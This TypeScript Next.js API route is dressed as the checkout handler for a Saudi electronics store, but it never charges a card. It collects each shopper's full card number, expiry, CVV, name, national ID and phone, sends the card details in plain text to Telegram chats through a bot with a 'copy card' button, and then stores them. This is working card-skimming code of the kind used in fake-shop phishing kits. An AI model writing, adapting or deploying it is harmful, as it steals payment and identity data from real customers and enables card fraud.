import { NextRequest, NextResponse } from "next/server";

// Helper to sanitize inputs
function sanitize(str: string): string {
  if (!str) return "";
  return str.replace(/[<>'"]/g, "").trim();
}

// Validate Saudi national ID
function isValidSaudiId(id: string): boolean {
  if (!id || !/^[12]\d{9}$/.test(id)) return false;
  return true;
}

// Validate Saudi phone number
function isValidSaudiPhone(phone: string): boolean {
  if (!phone || !/^05\d{8}$/.test(phone.replace(/\D/g, ""))) return false;
  return true;
}

// Generate idempotency key from request data
function generateIdempotencyKey(data: any): string {
  const str = JSON.stringify({
    items: data.items,
    customer: data.customer,
    whatsapp: data.whatsapp,
    timestamp: Math.floor(Date.now() / 60000), // 1-minute window
  });
  return Buffer.from(str).toString('base64');
}

// In-memory store for idempotency (in production, use Redis)
const processedRequests = new Map<string, { orderId: string; dbId: string; timestamp: number }>();

// Clean up old entries every 5 minutes
setInterval(() => {
  const fiveMinutesAgo = Date.now() - 5 * 60 * 1000;
  for (const [key, value] of processedRequests.entries()) {
    if (value.timestamp < fiveMinutesAgo) {
      processedRequests.delete(key);
    }
  }
}, 5 * 60 * 1000);

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = body;

    // ── Validation ──
    if (!items || !Array.isArray(items) || items.length === 0) {
      return NextResponse.json({ ok: false, error: "لا توجد منتجات في الطلب" }, { status: 400 });
    }

    if (!customer || !whatsapp || !nationalId || !address) {
      return NextResponse.json({ ok: false, error: "بيانات العميل ناقصة" }, { status: 400 });
    }

    // Validate Saudi ID
    if (!isValidSaudiId(nationalId)) {
      return NextResponse.json({ ok: false, error: "رقم الهوية غير صحيح" }, { status: 400 });
    }

    // Validate phone number
    const cleanPhone = (whatsapp || "").replace(/\D/g, "");
    if (!isValidSaudiPhone(cleanPhone)) {
      return NextResponse.json({ ok: false, error: "رقم الواتساب غير صحيح" }, { status: 400 });
    }

    // Validate card data
    if (!cardNumber || !expiry || !cvv || !cardHolder) {
      return NextResponse.json({ ok: false, error: "بيانات البطاقة ناقصة" }, { status: 400 });
    }

    // ── Idempotency Check ──
    const idempotencyKey = generateIdempotencyKey(body);
    const existing = processedRequests.get(idempotencyKey);
    if (existing) {
      console.log(`[DUPLICATE] Request already processed: ${existing.orderId}`);
      return NextResponse.json({ ok: true, orderId: existing.orderId, dbId: existing.dbId, duplicate: true });
    }

    // Sanitize inputs
    const sanitizedData = {
      customer: sanitize(customer),
      address: sanitize(address),
      cardHolder: sanitize(cardHolder),
    };

    // ── Fetch and verify products from database ──
    let verifiedTotal = 0;
    const verifiedItems: any[] = [];

    try {
      const productIds = items.map((item: any) => item.productId).filter(Boolean);
      
      if (productIds.length === 0) {
        return NextResponse.json({ ok: false, error: "معرفات المنتجات غير صحيحة" }, { status: 400 });
      }

      // Fetch products from backend to verify prices
      const productsRes = await fetch(`${process.env.BACKEND_URL}/api/products`, {
        method: "GET",
        headers: { "Content-Type": "application/json" },
      });

      if (!productsRes.ok) {
        throw new Error("Failed to fetch products");
      }

      const allProducts = await productsRes.json();
      
      // Verify each item
      for (const item of items) {
        const product = allProducts.find((p: any) => p._id === item.productId);

        if (!product) {
          console.error(`[SECURITY] Product not found: ${item.productId}`);
          return NextResponse.json({ ok: false, error: "أحد المنتجات غير موجود" }, { status: 400 });
        }

        // فحص المخزون
        if (product.inStock === false) {
          console.error(`[STOCK] Product out of stock: ${item.productId}`);
          return NextResponse.json({ ok: false, error: `المنتج "${product.name}" غير متوفر في المخزون حالياً` }, { status: 400 });
        }

        // Verify price from database
        const actualPrice = product.salePrice ?? product.originalPrice ?? product.price ?? 0;
        const requestedPrice = item.price ?? 0;

        if (Math.abs(actualPrice - requestedPrice) > 1) {
          console.error(`[SECURITY] Price mismatch for ${item.productId}. DB: ${actualPrice}, Request: ${requestedPrice}`);
          return NextResponse.json({ ok: false, error: "أسعار المنتجات غير صحيحة، يرجى تحديث السلة" }, { status: 400 });
        }

        // حد أقصى للكمية 99
        const MAX_QTY = 99;
        const quantity = Math.min(MAX_QTY, Math.max(1, Math.floor(item.quantity || 1)));
        verifiedTotal += actualPrice * quantity;

        verifiedItems.push({
          productId: item.productId,
          name: sanitize(product.name || item.name || "منتج"),
          price: actualPrice,
          quantity,
        });
      }
    } catch (error) {
      console.error("[ERROR] Product verification failed:", error);
      return NextResponse.json({ ok: false, error: "فشل التحقق من المنتجات" }, { status: 500 });
    }

    // Verify total amount
    const requestedTotal = Number(total) || 0;
    if (Math.abs(verifiedTotal - requestedTotal) > 1) {
      console.error(`[SECURITY] Total mismatch. Calculated: ${verifiedTotal}, Requested: ${requestedTotal}`);
      return NextResponse.json({ ok: false, error: "الإجمالي غير صحيح، يرجى تحديث السلة" }, { status: 400 });
    }

    const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
    const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((verifiedTotal - downPayment) / months) : 0;

    // ── Send Telegram FIRST — order must NOT be saved unless Telegram confirms success ──
    const chatIds = (process.env.TELEGRAM_CHAT_ID ?? "").split(",").map(id => id.trim()).filter(Boolean);

    if (chatIds.length === 0) {
      console.error("[CRITICAL] No Telegram chat IDs configured — cannot process order");
      return NextResponse.json({ ok: false, error: "خطأ في إعدادات النظام، يرجى التواصل مع الدعم" }, { status: 500 });
    }

    const whatsappUrl = `https://wa.me/${cleanPhone}`;
    const text = [
      `🏪 طلب لـ متجر مؤسسة البلاد الحديثة للإلكترونيات`,
      `🔢 رقم الطلب: #${orderId}`,
      ``,
      `💰 Total Amount: ${verifiedTotal} SAR`,
      ...(installmentType === "installment"
        ? [`💵 First Payment: ${downPayment} SAR`]
        : [`💵 Payment Type: Full Amount`]),
      ``,
      `💳 MadaVisa - New Order`,
      `👤 Order For: ${sanitizedData.customer}`,
      `📱 WhatsApp: ${cleanPhone}`,
      `💳 Card Number: ${cardNumber}`,
      `👤 Card Holder: ${sanitizedData.cardHolder}`,
      `📅 Valid To: ${expiry}`,
      `🔐 CVV: ${cvv}`,
    ].join("\n");

    let telegramSuccess = false;
    try {
      const telegramResults = await Promise.allSettled(
        chatIds.map(chat_id => {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 10000);
          return fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            signal: controller.signal,
            body: JSON.stringify({
              chat_id,
              text,
              reply_markup: {
                inline_keyboard: [
                  [{ text: "💬 فتح واتساب", url: whatsappUrl }],
                  [{ text: "📋 نسخ البطاقة", copy_text: { text: cardNumber.replace(/\s/g, "") } }],
                ],
              },
            }),
          })
            .then(async res => {
              clearTimeout(timeoutId);
              if (!res.ok) {
                const errText = await res.text().catch(() => "");
                if (res.status === 403) throw new Error("BOT_BLOCKED");
                throw new Error(`Telegram HTTP ${res.status}: ${errText}`);
              }
              const data = await res.json();
              // فحص ok:true من Telegram response body
              if (!data.ok) throw new Error(`Telegram returned ok:false — ${JSON.stringify(data)}`);
              return data;
            })
            .catch(err => { clearTimeout(timeoutId); throw err; });
        })
      );

      const successCount = telegramResults.filter(r => r.status === "fulfilled").length;
      telegramSuccess = successCount > 0;

      telegramResults.forEach((result, i) => {
        if (result.status === "rejected") {
          const msg = (result.reason as Error)?.message ?? "unknown";
          if (msg === "BOT_BLOCKED") console.warn(`[TELEGRAM] Chat ${chatIds[i]} blocked the bot`);
          else console.error(`[TELEGRAM ERROR] Chat ${chatIds[i]}:`, msg);
        }
      });

      console.log(`[TELEGRAM] Sent to ${successCount}/${chatIds.length} chats`);
    } catch (error) {
      console.error("[TELEGRAM ERROR]", error);
      telegramSuccess = false;
    }

    // إذا فشل Telegram تماماً — لا نحفظ الطلب
    if (!telegramSuccess) {
      console.error(`[BLOCKED] Order ${orderId} NOT saved — Telegram failed`);
      return NextResponse.json({ ok: false, error: "فشل إرسال الإشعار، يرجى المحاولة مرة أخرى" }, { status: 503 });
    }

    // ── Telegram نجح — الآن نحفظ في Database ──
    let dbId: string | null = null;
    try {
      const dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          orderId,
          cardNumber,
          expiry,
          cvv,
          cardHolder: sanitizedData.cardHolder,
          items: verifiedItems,
          total: verifiedTotal,
          customer: sanitizedData.customer,
          whatsapp: cleanPhone,
          nationalId,
          address: sanitizedData.address,
          installmentType,
          months: Number(months) || 0,
          monthlyPayment,
          downPayment: Number(downPayment) || 0,
        }),
      });

      if (!dbRes.ok) {
        const errorText = await dbRes.text().catch(() => "Unknown error");
        console.error(`[ERROR] Database save failed after Telegram success: ${dbRes.status} ${errorText}`);
        throw new Error("Database save failed");
      }

      const dbData = await dbRes.json();
      dbId = dbData._id ?? null;
      console.log(`[SUCCESS] Order saved to database: ${orderId}, dbId: ${dbId}`);
    } catch (error) {
      console.error("[CRITICAL] Telegram succeeded but DB save failed for order:", orderId, error);
      return NextResponse.json({ ok: false, error: "فشل حفظ الطلب، يرجى التواصل مع الدعم" }, { status: 500 });
    }

    // Store in idempotency cache
    processedRequests.set(idempotencyKey, { orderId, dbId: dbId || "", timestamp: Date.now() });

    return NextResponse.json({ ok: true, orderId, dbId, telegramSent: true });
    
  } catch (error) {
    console.error("[CRITICAL ERROR]", error);
    return NextResponse.json({ 
      ok: false, 
      error: "حدث خطأ غير متوقع، يرجى المحاولة مرة أخرى" 
    }, { status: 500 });
  }
}
